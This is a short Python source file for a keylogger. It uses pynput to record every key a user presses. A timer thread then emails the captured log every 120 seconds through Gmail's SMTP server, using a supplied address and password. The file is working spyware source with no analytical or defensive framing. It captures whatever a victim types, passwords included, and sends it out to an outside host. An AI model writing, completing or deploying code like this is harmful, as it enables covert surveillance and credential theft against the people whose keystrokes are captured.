#! /usr/bin/env python3
from pynput import keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self, email, password):
        self.log = "Keylogger started"
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def press(self, key): 
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key) 

    def report(self):
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        time = threading.Timer(120, self.report)
        time.start()

    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def listener(self):
        # Collect events until released
        listener = keyboard.Listener(on_press=self.press)
        with listener:
            self.report()
            listener.join()
